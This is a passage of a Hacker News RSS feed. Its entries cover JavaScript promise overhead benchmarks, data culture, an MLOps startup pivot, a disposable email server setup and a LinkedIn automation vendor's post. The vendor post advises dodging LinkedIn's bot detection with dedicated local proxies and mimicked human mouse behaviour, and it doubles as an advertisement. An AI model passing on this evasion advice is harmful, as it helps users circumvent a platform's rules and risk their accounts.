  <span>fibonacci</span><span>(</span>i<span>)</span><span>.</span><span>then</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span><span>}</span><span>)</span><span>;</span>
<span>}</span></code></pre></div>
<p>When running this on <a href="https://jsbench.me/jrkj8dqar8/1">JSBench.Me</a>, the promise case is shown to be <strong>86% slower</strong> on Chrome 87 than the non-promise case.</p>
<p>While this is an unrealistic case, it shows that promises can significantly impact performance, especially in hot code paths.</p>
<h4 id="test-2---non-recursive-fibonacci"><a href="#test-2---non-recursive-fibonacci" aria-label="test 2   non recursive fibonacci permalink"></a>Test 2 - Non-Recursive Fibonacci</h4>
<p>A non-recursive Fibonacci sequence shows what sort of overhead a low-cost method call could have to get a more real-world view. In this case, each call to the function will only have the overhead of a single promise.</p>
<p>The following code has been used,</p>
<div data-language="javascript"><pre><code>
<span>function</span> <span>fibonacci</span><span>(</span><span>num</span><span>)</span> <span>{</span>
  <span>var</span> a <span>=</span> <span>1</span><span>,</span>
    b <span>=</span> <span>0</span><span>,</span>
    temp<span>;</span>
  <span>while</span> <span>(</span>num <span>&gt;=</span> <span>0</span><span>)</span> <span>{</span>
    temp <span>=</span> a<span>;</span>
    a <span>=</span> a <span>+</span> b<span>;</span>
    b <span>=</span> temp<span>;</span>
    num<span>--</span><span>;</span>
  <span>}</span>
  <span>return</span> b<span>;</span>
<span>}</span>
<span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> <span>100</span><span>;</span> i<span>++</span><span>)</span> <span>{</span>
  <span>fibonacci</span><span>(</span>i<span>)</span><span>;</span>
<span>}</span></code></pre></div>
<div data-language="javascript"><pre><code>
<span>async</span> <span>function</span> <span>fibonacci</span><span>(</span><span>num</span><span>)</span> <span>{</span>
  <span>var</span> a <span>=</span> <span>1</span><span>,</span>
    b <span>=</span> <span>0</span><span>,</span>
    temp<span>;</span>
  <span>while</span> <span>(</span>num <span>&gt;=</span> <span>0</span><span>)</span> <span>{</span>
    temp <span>=</span> a<span>;</span>
    a <span>=</span> a <span>+</span> b<span>;</span>
    b <span>=</span> temp<span>;</span>
    num<span>--</span><span>;</span>
  <span>}</span>
  <span>return</span> b<span>;</span>
<span>}</span>
<span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> <span>100</span><span>;</span> i<span>++</span><span>)</span> <span>{</span>
  <span>fibonacci</span><span>(</span>i<span>)</span><span>.</span><span>then</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span><span>}</span><span>)</span><span>;</span>
<span>}</span></code></pre></div>
<p>When running this on <a href="https://jsbench.me/1dkj8e6n54/1">JSBench.Me</a>, the promise case is shown to be <strong>81% slower</strong> on Chrome 87 than the non-promise case.</p>
<p>This result shows that adding an async modifier to the method can almost double the time it takes to execute simple functions. For hot code, this could make a significant difference.</p>
<h4 id="test-3---promise-vs-asyncawait"><a href="#test-3---promise-vs-asyncawait" aria-label="test 3   promise vs asyncawait permalink"></a>Test 3 - Promise vs Async/Await</h4>
<p>So we've seen what just adding the async keyword can do, but what if we use promises directly instead?</p>
<p>Using async code from the previous test case, and the following code,</p>
<div data-language="javascript"><pre><code>
<span>function</span> <span>fibonacci</span><span>(</span><span>num</span><span>)</span> <span>{</span>
  <span>return</span> <span>new</span> <span>Promise</span><span>(</span><span>(</span><span>resolve<span>,</span> reject</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>var</span> a <span>=</span> <span>1</span><span>,</span>
      b <span>=</span> <span>0</span><span>,</span>
      temp<span>;</span>
    <span>while</span> <span>(</span>num <span>&gt;=</span> <span>0</span><span>)</span> <span>{</span>
      temp <span>=</span> a<span>;</span>
      a <span>=</span> a <span>+</span> b<span>;</span>
      b <span>=</span> temp<span>;</span>
      num<span>--</span><span>;</span>
    <span>}</span>
    <span>resolve</span><span>(</span>b<span>)</span><span>;</span>
  <span>}</span><span>)</span><span>;</span>
<span>}</span>
<span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> <span>100</span><span>;</span> i<span>++</span><span>)</span> <span>{</span>
  <span>fibonacci</span><span>(</span>i<span>)</span><span>.</span><span>then</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span><span>}</span><span>)</span><span>;</span>
<span>}</span></code></pre></div>
<p>When running this on <a href="https://jsbench.me/3jkj8ekl0r/1">JSBench.Me</a>, the case using promises rather than async/await is shown to be a further <strong>26% slower</strong> on Chrome 87 than the async/await case.</p>
<h3 id="solutions"><a href="#solutions" aria-label="solutions permalink"></a>Solutions</h3>
<p>There are a few potential solutions for this issue. Firstly, however, it's important to point out that unless you've confirmed a section of code to be causing performance issues, you don't need to optimise it. Once you've used a profiler to verify that it's worth optimising a piece of code, then it's worth investigating.</p>
<p>The simplest solution here is to perform data fetching or other asynchronous operations closer to the application's root and pass the resulting data down. Often program structures that involve deep-nested async/await paths exhibit poor separation of concerns. Ideally, a single system should not load and use data; instead, it should receive the data from another system that loads it. This structure also has the added benefit of being much more testable. Doing this should prevent the need to nest async/await methods deeply.</p>
<p>Another option is to only use the async keyword for the inner-most method if possible. Each method with an async keyword adds overhead, so if you can work with the promise directly outside of that function, you're not introducing further overhead. This technique can be even more helpful when the method only sometimes needs to return a promise. In this case, including the async keyword introduces the overhead always. If you return a promise directly, overhead (albeit slightly more overhead) happens only a portion of the time.</p>
<h3 id="conclusion"><a href="#conclusion" aria-label="conclusion permalink"></a>Conclusion</h3>
<p>Promises and Async/Await introduce measurable overhead into JavaScript code. This problem can be worked around in most cases when necessary, yet, it will not pose any issue most of the time. As with most things, understanding the various trade-offs in performance is essential when optimising code. If you've identified a hot code path that makes heavy use of async/await, it may be worth investigating ways to minimise that.</p></div></div>]]>
            </description>
            <link>https://matthewmiller.dev/blog/javascript-promise-overhead/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25558279</guid>
            <pubDate>Mon, 28 Dec 2020 11:06:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Data: Use, with Caution]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25558260">thread link</a>) | @ReDeiPirati
<br/>
December 28, 2020 | https://staysaasy.com/product/2020/12/24/data.html | <a href="https://web.archive.org/web/*/https://staysaasy.com/product/2020/12/24/data.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>In the modern business environment everyone wants to be data-driven. You can hear the envy in a conference room when a good graph hits the audience right in their data-loving brains. Data is good. Data rules all.</p>

<p>What you see less are the glaring imperfections in most data. The show must go on - fine-grained analysis of the data used for strategic decisions holds up things up. Deep dives into data require ability to get that data, interpret that data, and understand that data. This creates a power imbalance where the data-creator is much better positioned to tell the story they want to tell; the data-consumer is hard-pressed to disagree with that story in real-time. Alas, decisions happen in conference rooms, data analysis happens at a desk.</p>

<p>These two realities are Saasy’s Axioms of Data:</p>
<ul>
  <li>Data wins arguments. Imperfect data beats no data.</li>
  <li>All data is imperfect.</li>
</ul>

<p>These realities have 3 major implications for how you should approach getting things done:</p>
<ul>
  <li>Show up with data.</li>
  <li>Use data as a compass, not a map.</li>
  <li>Beware the abuse of data.</li>
</ul>

<h2 id="show-up-with-data">Show Up With Data</h2>

<p>Most of the time some data is better than no data. You should strive to be data-driven. Our collective admiration of data comes from a reasonable instinct.</p>

<p>In a world where data is useful and people view it as a sign of mature, rational, and thorough work, you should show up with data. No matter your role, you will get more of the things you want and do a better job if you show up with data.</p>

<p>As many have pointed out, you can measure anything to get data for your case:</p>
<ul>
  <li>Our team cycle time decreased by 20% last half on repos that were converted to using React and remained constant on ones that weren’t. We should convert the remainder of our repos to React.</li>
  <li>We left 290 style comments on pull requests in the last quarter. If each of those take 2 minutes to resolve on average, replacing that mechanism with an automatic enforced style-guide will save us a full day per quarter.</li>
  <li>Only 5% of IT requests take longer than 1 week, but those that do take an average 3 months. Those tickets also are responsible for the majority of internal-NPS for the IT team below a 4. We need to implement a process to get rid of these outliers.</li>
</ul>

<p>All of these arguments are more compelling because they are data-supported. The data is imperfect, but it’s useful. It gives an overall, high-level assessment of the situation. It also allows for measurement of results, using the same data after the change.</p>

<p>If you’re not using data regularly you’re probably leaving a lot of impact on the floor, no matter if you’re a new IC right out of college or a seasoned executive. Show up with data.</p>

<h2 id="data-is-a-compass-not-a-map">Data Is A Compass, Not A Map</h2>

<p>Data exists to help you understand, at a high level, what would be useful to do and how effective your actions have been. However, the more granular the decisions are, the less useful data becomes. Data’s utility is strongest when it tells a clear story, not when it whispers details. So you should use data more when the data is very clear and makes sense, and you should rely on it less when it’s more nuanced.</p>

<p>For example, employee satisfaction surveys provide useful data when the signal is clear and blunt: people are unhappy or people are happy. The surveys are less useful when it comes to specific feedback. A sole comment about the espresso machine might say that it’s too loud. If you then move the machine to the hallway, you might find that 90% of your team hates the new location because it’s farther away. You used the data like a set of instructions, not a broad picture.</p>

<p>Another example: I had a feeling awhile back that remote candidates were turning down our offers more than local candidates. I pulled the data and the story was clear - remote candidates actually closed at a significantly higher rate than local candidates. The data was imperfect, but it gave no credence to my assumption, and I had other ways I can improve recruiting so I moved on.</p>

<p>In the compass analogy: I thought I was heading South, but my compass told me I was heading North. I might have actually been going NorthWest, but I’m happy enough to know that I’m not going South.</p>

<p>You might think that the advocacy to use data when it’s bold and intuitive is a catch-22, that data is most useful when it’s counter to your intuition and changes your behavior. However, I disagree - data is most often important in two cases: 1) it provides direction when you have no prior intuition at all and 2) it sets you up to measure the success of your work from the get-go.</p>

<h2 id="beware-the-abuse-of-data">Beware The Abuse Of Data</h2>

<p>Because data is powerful and imperfect, and because decisions are using presented data and not data-analysis, there are many who would wield its power without prudence. You can see these people show up with hand-crafted data any time they want to get their way. And because it can seem petty and defensive to question that data - after all, you’d be the amateur who didn’t show up with data - those people can often get their way, even when the data isn’t bold and the conclusions are debatable.</p>

<p>There’s no one-size-fits-all solution to these situations. High level though, I’d recommend the following:</p>
<ul>
  <li>Work to ensure your company has a healthy data culture</li>
  <li>Show up with data for the things you really care about</li>
</ul>

<p>First, a healthy data culture uses data but understands its limitations. A healthy data culture is a humble data culture. If data is moving you towards good decisions with clear signals and helps you measure success, that’s great. If data is wielded as a weapon or is paraded around as a sign of greatness, watch out.</p>

<p>For an example of a bad data culture, your no-assholes-allowed company might put up with a salesperson because “they put up crazy numbers”. Indeed, that person might wear their quarterly numbers like a badge that lets them behave on a different plane of existence. However, are you tracking how often they are making concessions with negative downstream impacts? Are you tracking how much time they take from the rest of the organization to support their sales? This is to say nothing of the culture impact of that person.</p>

<p>The nuance here is important. Their quarterly numbers tell a clear story - they sell a lot of product. But the question was more nuanced: should we put up with their behavior? In reality, you likely have almost no data that quantifies the totality of their impact on the company. Their sales are just one number in a complex ecosystem.</p>

<p>In this example, you used imperfect data to let you do something you wouldn’t otherwise. You made data a king and ended up being ruled by a tyrant.</p>

<p>Second, if you really care about something, considering showing up with data. Otherwise, you’ll be at a disadvantage if someone else does.</p>

<h2 id="summary">Summary</h2>

<p>Data, like any power, should be wielded with respect, humility, and caution. However, unlike most power, you should be wielding it regularly.</p>

    




  </div></div>]]>
            </description>
            <link>https://staysaasy.com/product/2020/12/24/data.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25558260</guid>
            <pubDate>Mon, 28 Dec 2020 11:03:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[We successfully pivoted a SaaS business to open-source MLOps tooling]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25558076">thread link</a>) | @benkoller
<br/>
December 28, 2020 | https://blog.maiot.io/a-most-unusual-year/ | <a href="https://web.archive.org/web/*/https://blog.maiot.io/a-most-unusual-year/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="post-content">
    <div id="blogpost">
        <p>As this is the end of the year, itâ€™s a great chance to remind yourself: how did we get here?</p>

<p>Let me beginn with a flashback to 2019. As a company, weâ€™re focussed on optimising remaining useful live of industrial assets through clever use of Machine Learning for predictive analysis, root-cause analysis and other forms of reasoning. We managed to secure a few big projects and very promising POCs, and across the board we were able to show good results. One of our projects even got government funding, providing a nice runway going forward.</p>

<p>We got the traditionally lengthy sales cycles with many leading industry players started, and we even hired our first full-time employee.</p>

<p>All was set up for first commercial success of our approach and our â€œasset optimisation platformâ€� in 2020.</p>

<p>Then the pandemic hit. Within a few weeks, all our sales leads fizzled away - millions of euros in deal sizes, disappeared in thin air. By March, we were looking at an empty sales funnel.</p>

<p>We had find a new path. We took stock, and we acted entrepreneurial.</p>

<h2 id="a-look-at-what-weve-got">A look at what weâ€™ve got</h2>

<p>Taking stock of what we actually had, in terms of intellectual property, was a great recap of our journey so far <a href="https://www.youtube.com/watch?v=UDfxoKmc8qc">(if youâ€™re interested, check out a talk I recently gave on what we learned about ML pipelines)</a>. To summarise, we had to our name:</p>

<ul>
  <li>A great team (experienced ML engineers, Ops expertise and a good entrepreneurial fit)</li>
  <li>A purpose-built tech stack for reproducible ML pipelines</li>
  <li>Experience running small and large projects</li>
  <li>A good network of other startups and developers in ML-related positions across the globe</li>
</ul>

<h2 id="talking-to-people">Talking to people</h2>

<p>We saw the economic effects of the pandemic very early - at least from an european perspective. After taking close stock, we had to understand how (and if) Machine Learning would continue to play a role for our leads and network. Taking a page out of the great UX researchers Iâ€™ve had the chance to work with over my career, we decided to do user interviews. Lo and behold, after doing ~30 early interviews, a picture emerged.</p>

<p>Teams engaged in ML projects lost significant chunks of time on unrepeatable projects as well as managing dysfunctional franken-infrastructures. Teams not yet engaged in ML feared it to be a black hole for time and effort to build up a reliable tech stack for getting experiments into production, as existing systems would need integration at many stages of the ML lifecycle.</p>

<p>An interesting side-fact became clear to us, too: there was a lot of scepticism towards ML-based SaaS products, but a lot of trust towards dev-tooling.</p>

<p>More importantly, however - we had solved exactly the problems our interviewees faced for ourselves. We were sitting on something commercially relevant, and we were looking at a great opportunity.</p>

<h2 id="understanding-your-market-part-one">Understanding your market, part one</h2>

<p>With this new-found confirmation we set out to transform our tech-stack from internal-facing supportive tooling to an actual product. Looking at the market, a split was noticeable.</p>

<p>On the one side, open-source tooling like Kubeflow and MLFlow was solving aspects of the MLOps problem space, but posed significant investments to the teams we were talking to in our interviews. Tooling was either missing the point of Data Scientists, or alienated product leads and DevOps teams with convoluted, messy or badly documented paths from experiment to production.</p>

<p>On the other side were very expensive commercial solutions, attempting to solve large chunks of the ML lifecycle with proprietary offerings.</p>

<h2 id="commercial-first">Commercial-first</h2>

<p>Given the layout of the MLOps market, we spotted an opportunity to flip the proverbial table. Donâ€™t get me wrong, weâ€™re not radical geniuses, we much rather are interested observers of entrepreneurial trends. Given the success of Stripe, Segment and others, this constellation of players screamed â€œtransactional business modelâ€� to us. A managed MLOps platform to train models easily in various public clouds, at linearly scaling prices, based on actual usage, not arbitrary license models or per-seat, and at a fraction of the going rates.</p>

<h2 id="understanding-the-market-part-two">Understanding the market, part two</h2>

<p>By now we know: Our hypothesis, teams are just waiting for a managed MLOps solution with usage-based pricing and reproducible pipelines as focus, was off. This was not immediately clear to us, of course.</p>

<p>One of our smartest plays saved us in the end - we never stopped doing user interviews. We demoâ€™ed our product status quo multiple times per week, we had two soft-launches and continuously engaged with the community on conferences, reddit, slack - you name it.</p>

<p>And people loved our take on MLOps. Our vision resonated deeply. All model trainings are guaranteed to be reproducible, tracking is deeply baked-in, integrations to popular tooling are easy and extensible - these are the key concerns of the teams we were talking to.</p>

<p>However, it would have been ludicrous to switch their tech-stacks to a commercial solution. No, if we wanted to drive adoption and actually have an impact on how the world dealt with MLOps, we had to give these teams the option to adopt our vision in their projects on their own terms. We had to open-source.</p>

<p>As Iâ€™ve written in the past, <a href="http://blog.maiot.io/open-source">we are huge proponents of open-source software</a>. Large parts of our own tooling would be possible without the work of open-source giants, on whose shoulders we can stand.</p>

<h2 id="the-jury-is-still-out">The jury is still out</h2>

<p>As of writing this, the jury is still out if weâ€™re leaving the dent in the universe that we want to leave behind. But, and this is a hugely rewarding feeling, we have all the right indications that we nailed it this time. Weâ€™ve breached 200 GitHub stars in less than a week of going public, weâ€™ve been on the front page of Hackernews, weâ€™ve been trending on GitHub, and ZenML is racing to 1000 <code>pip install</code>â€™s.</p>

<p>If youâ€™re running ML projects, or just personally got curious, head over to <a href="https://github.com/maiot-io/zenml">ZenMLâ€™s GitHub page</a> and get started with reproducible Machine Learning!</p>

    </div>
</section></div>]]>
            </description>
            <link>https://blog.maiot.io/a-most-unusual-year/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25558076</guid>
            <pubDate>Mon, 28 Dec 2020 10:17:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[LinkedIn Automation Might Get You Blocked]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25558068">thread link</a>) | @nevodavid
<br/>
December 28, 2020 | https://linvo.io/2020/12/05/linkedin-automation-might-get-you-blocke/ | <a href="https://web.archive.org/web/*/https://linvo.io/2020/12/05/linkedin-automation-might-get-you-blocke/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <div data-elementor-type="wp-post" data-elementor-id="6857" data-elementor-settings="[]">
<div>
<div>
<section data-id="67b36beb" data-element_type="section">


</section>
<section data-id="21484a18" data-element_type="section">
<div>
<div>
<div data-id="721c971b" data-element_type="column">
<div>
<div>
<div data-id="3e1cb47f" data-element_type="widget" data-widget_type="heading.default">
<p>
<h2>Linkedin Automation Might Get You Blocked.</h2> </p>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="31d5200b" data-element_type="section">
<div>
<div>
<div data-id="9067bd9" data-element_type="column">
<div>
<div>
<div data-id="123ed40c" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<div><p>Nowadays many companies offering unique features for automating Linkedin<span>.<br></span></p><p><b>But let’s dive in to how Linkedin Automation works.</b></p><p>Automation tools are logging into your LinkedIn and perform actions (clicks).</p><p>There are three kinds of automation:</p></div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="506e178b" data-element_type="section">
<div>
<div>
<div data-id="5a025cf" data-element_type="column">
<div>
<div>
<div data-id="a46508b" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<div><p><span>1). <b>Login with Linkedin username and password.</b></span></p><p><span><b>It can be via the web or an application.</b></span></p><p><b>Cons:</b></p><p>* It’s saves you Linkedin username and password. That’s a little scary.</p><p>* It’s creating a new login device in your account – and here is the tricky part, most Linkedin Automations tools login from from a Linux operating system, that’s a big no-no.</p><p><b>Pros:</b></p><p><b>* </b>They can relog themselves to Linkedin in case of a disconnection – without you needing to do anything.</p></div>
</div>
</div>
</div>
</div>
</div>
<div data-id="2ef26dde" data-element_type="column">
<div>
<div>
<div data-id="1fef062" data-element_type="widget" data-widget_type="image.default">
<div>
<p><img width="960" height="699" src="https://linvo.io/wp-content/uploads/2020/12/Screen-Shot-2020-12-05-at-13.39.57.png" alt="" loading="lazy"> </p>
</div>
</div>
<div data-id="6e22ac16" data-element_type="widget" data-widget_type="image.default">
<div>
<p><img width="960" height="159" src="https://linvo.io/wp-content/uploads/2020/12/Screen-Shot-2020-12-05-at-13.51.27.png" alt="" loading="lazy"> </p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="707827de" data-element_type="section">
<div>
<div>
<div data-id="727c550e" data-element_type="column">
<div>
<div>
<div data-id="7bb5199e" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<div><p><span>2).&nbsp;</span><span><b>Local automation, using a chrome extension – You are the person who performs the automation.</b></span></p><p><b>Cons:</b></p><p>* Automation happens in your browser; you can’t touch it while it happens.</p><p>* Robot click – In local automation, you can’t simulate human clicks in code – Linkedin claims they can detect it.</p><p>* Elements change in page – Most chrome extensions will change your page elements – Linkedin claims they can detect it.</p><p><b>Pros:</b></p><p>* All the operations are being made by you, that’s a significant benefit.</p></div>
</div>
</div>
</div>
</div>
</div>

</div>
</div>
</section>
<section data-id="60de5cda" data-element_type="section">
<div>
<div>
<div data-id="5dd8bbcc" data-element_type="column">
<div>
<div>
<div data-id="21286002" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<div><p><span>3). </span><b>Chrome extensions use your Linkedin cookies – </b><span><b>Recommended</b></span><b>.</b></p><p><b>Cons:</b></p><p><span><b>*</b></span><span> You need to check the permissions of the chrome extension at the google webstore.<br></span>Many companies ask for extra permissions they don’t need.<br>Make sure it can only access your Linkedin, company dashboard, and cookies.</p><p><b>Pros:</b></p><p><b>* </b>No access to your Linkedin Username and Password.</p><p><b>*</b> Not creating a new logged-in device.</p><p><b>*</b> Once you delete the extension, the extensions’ owner won’t have access to your account.</p></div>
</div>
</div>
</div>
</div>
</div>
<div data-id="545fbc1c" data-element_type="column">
<div>
<div>
<div data-id="2f2ade77" data-element_type="widget" data-widget_type="image.default">
<div>
<p><img width="960" height="619" src="https://linvo.io/wp-content/uploads/2020/12/Screen-Shot-2020-12-05-at-14.png" alt="" loading="lazy"> </p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="202bf6aa" data-element_type="section">
<div>
<div>
<div data-id="2ace1e1d" data-element_type="column">
<div>
<div>
<div data-id="5c363f53" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<div><p>In case you have chosen to use a background automated tool, there is one thing you must address.</p><p><b>The location of where your actions are being performed.</b></p><p>Most companies will hide this information from you, but this is crucial.</p><p>The worst scenario is that the Linkedin Automation tool will make actions from the computer it’s running on. That’s a big no-no.</p><p>It’s straightforward. Your account will look something like that:</p></div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="4d2e1c44" data-element_type="section">
<div>
<div>
<div data-id="3f09d287" data-element_type="column">
<div>
<div>
<div data-id="4f80314e" data-element_type="widget" data-widget_type="image.default">
<div>
<p><img width="768" height="400" src="https://linvo.io/wp-content/uploads/2020/12/Screen-Shot-2020-12-05-at-14.45.46.png" alt="" loading="lazy"> </p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="2ad4cb24" data-element_type="section">
<div>
<div>
<div data-id="247a88f0" data-element_type="column">
<div>
<div>
<div data-id="65a61db8" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<div><p>As you can see, the browser is “Linux” and the Owner is “Digitalocean Llc” which is telling Linkedin, <b>Hello, I am a bot.</b></p><p>To better protect you, the Linkedin automation company should require you to use a proxy. They might be able to provide it.</p><p><span><b>What is a proxy?</b></span></p><p>A proxy is a computer that sits in a different location and will make all your Linkedin actions.</p><p><b>There are two types of proxies:</b></p><p>1. Shared proxies – Multiple users using the same computer.<br>2. Dedicated proxies – Only one user can use the computer.</p><p><b>Using a shared one is dangerous&nbsp;–&nbsp;</b>Linkedin can detect that multiple users are using the same computer.</p><p>Shared ones are much cheaper, and many companies are using them – <b>Check with your company.</b></p><p>Dedicated ones are expensive –&nbsp;<b>You will be the only one using this computer.</b></p><p><b>Every proxy sits in a different location – the closer it is to you, the safer.<br></b></p><p>If I live in Israel, I probably do not want to take action from the US because it looks weird that multiple activities are happening simultaneously from different locations.</p><p>Linkedin will not ban you for using a different computer – <b>they know you might be using a VPN, which is fine.</b></p><p><b>So which Linkedin Automation tool should you use?</b></p></div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="6bb6f3cb" data-element_type="section">
<div>
<div>
<div data-id="5a068926" data-element_type="column">
<div>
<div>

<div data-id="734cb7a4" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<div><p>Yes, it’s us 😀</p><p>We like to believe we are <b>the safest automation tool.</b></p><p>We provide every member with a <b>dedicated proxy (not shared!).</b></p><p><b>We mimic human-mouse behavior, and also, we offer very cool features.</b></p><p>We are using <a href="https://www.webshare.io/dedicated-proxy">Webshare.io</a> for dedicated proxies.</p><p><b>It costs us $6 per month.</b></p><p>We offer <b>a limited time lifetime deal for $30, it’s going to end soon</b>&nbsp;😨</p><p><b><a href="https://appsumo.com/linvo"><u>Check our deal at AppSumo</u></a></b></p></div>
</div>
</div>
</div>
</div>
</div>
<div data-id="61c2386d" data-element_type="column">
<div>
<div>
<div data-id="883f3a6" data-element_type="widget" data-widget_type="image.default">
<div>
<p><img width="960" height="482" src="https://linvo.io/wp-content/uploads/2020/12/Screen-Shot-2020-12-05-at-15.42.24.png" alt="" loading="lazy"> </p>
</div>
</div>
<div data-id="4164c995" data-element_type="widget" data-widget_type="image.default">
<div>
<p><img width="960" height="421" src="https://linvo.io/wp-content/uploads/2020/12/Screen-Shot-2020-12-05-at-15.41.43.png" alt="" loading="lazy"> </p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
</div>
</div>
</div>
</div></div>]]>
            </description>
            <link>https://linvo.io/2020/12/05/linkedin-automation-might-get-you-blocke/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25558068</guid>
            <pubDate>Mon, 28 Dec 2020 10:16:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Celestial Navigation]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25557669">thread link</a>) | @blewboarwastake
<br/>
December 28, 2020 | http://www.siranah.de/html/sail040a.htm | <a href="https://web.archive.org/web/*/http://www.siranah.de/html/sail040a.htm">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://www.siranah.de/html/sail040a.htm</link>
            <guid isPermaLink="false">hacker-news-small-sites-25557669</guid>
            <pubDate>Mon, 28 Dec 2020 08:33:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Self-hosted disposable email addresses with AHEM]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25557661">thread link</a>) | @edent
<br/>
December 28, 2020 | https://neilzone.co.uk/2020/12/self-hosted-disposable-email-addresses-with-ahem | <a href="https://web.archive.org/web/*/https://neilzone.co.uk/2020/12/self-hosted-disposable-email-addresses-with-ahem">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <div>
                <div>
                                                                                <p><img src="https://neilzone.co.uk/content/images/20201227164320-Screenshot%202020-12-27%20at%2016.42.25.png" alt="Screenshot of webpage showing AHEM email service"></p>

<p>I've run my own mailserver for years now, with a <em>catch-all</em> on some domains.</p>

<p>This means that, whenever a shop or service asks for my email address, I can give them a unique address, specific to them, without needing to configure anything.</p>

<p>This has a number of uses, but the main ones for me are:</p>

<ul>
<li>if their system is compromised, my email address is of no use for credential stuffing attacks (since it is used only for that one site/service)</li>
<li>if I get spam from which I cannot unsubscribe, I can kill that email address without disrupting anything else</li>
<li>if they leak or sell my email address, and someone else uses it, I can tell</li>
</ul>

<p>One thing this setup does not do well, though, is deal with the situation in which I want a disposable email address: an email address which exists long enough to receive one email.</p>

<p>That's because, once I've given someone their unique address, they can continue sending to it, and it will continue to funnel their email into my mailbox, until I take action to stop them.</p>

<p>Sometimes, I want — well, am forced — to give over an email address just to access something. (For example, I wanted to download a cycle map from Sustrans the other day, and they insisted on having an email address, which is nonsensical as they just emailed me a link to a PDF on their website. Why not just hyperlink the PDFs from the website, and skip the hassle?! (Spoiler: probably some kind of tracking.).)</p>

<p>In that kind of situation, I want a system for disposable email addresses, which exist only for a very short period of time, and which do not clog up my mailbox.</p>



<p>There are loads of services which offer this, some free and some paid, and, to date, I've just used one of those. Since I've not used them for anything private, it didn't matter too much to me that someone else can see the content of the email.</p>

<p>Indeed, if you are looking for privacy from "hiding in a crowd", using a third party service is probably <em>preferable</em> to hosting your own service.</p>

<p>However, that trade-off was acceptable to me, and since I prefer to host my own tools, having my own setup seemed like a useful thing to have, if it was relatively easy to do.</p>

<p>And it was.</p>

<p>Relatively.</p>



<p>It took me about 30 minutes to get a disposable email server running using <a href="https://github.com/o4oren/Ad-Hoc-Email-Server">AHEM</a>.</p>

<p>The instructions on github sort of worked, and I can't tell if the bits which did not work out of the box are because of my lack of familiarity with node.js, or incomplete / no longer accurate instructions. Let's assume it's my ignorance!</p>

<p>I had a bit of a fight with angular, to make the project build, and I solved the error message by forcibly installing a particular version of it. Not ideal, but it worked.</p>

<p>After that, it built with some warnings but no more errors.</p>



<p>Since it's an email service, you need to set an MX record for the domain you want to use, pointing to a record pointing to the IP address on which you're running AHEM.</p>

<p>I chose a sub-domain of my normal domain. I'm using it for both the email addresses, and also for accessing the web server (via nginx).</p>

<p>AHEM can support multiple email domains, so if I wanted to do the same for one of Sandra's domains, it would be a simple case of adding the domain to AHEM's .env file.</p>



<p>I can understand why people do it, but it bugs me all the same: why use static files hosted by a third party CDN, rather than just hosting them yourself?</p>

<p>Out of the box, AHEM uses some JavaScript resources hosted on Cloudflare. I used wget to download the scripts, and then replaced the references in index.html with localhost references instead.</p>

<p>Bingo.</p>



<p>By default, it runs on localhost:3000. Fine for testing, but not what I wanted permanently.</p>

<p>Since I had nginx on the server already, reverse-proxying to give a web interface over port 80, using the same sub-domain as for the email address itself (although anything else would work too; they are not connected) was easy.</p>

<p>It also meant that it was trivial (using certbot) to pop a TLS certifcate on the proxy, giving me TLS over 443. Even though the web interface will be firewalled off and accessible only without our private network, I'd prefer to have TLS in place anyway.</p>

<p>I'm not sure why, but the basic config was 404'ing traffic to /socket.io/, so I added a specific <em>Location</em> section for that:</p>

<pre><code>location /socket.io/ {
    proxy_pass http://localhost:3000;       
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection "Upgrade";
    proxy_set_header Host $host;
}
</code></pre>



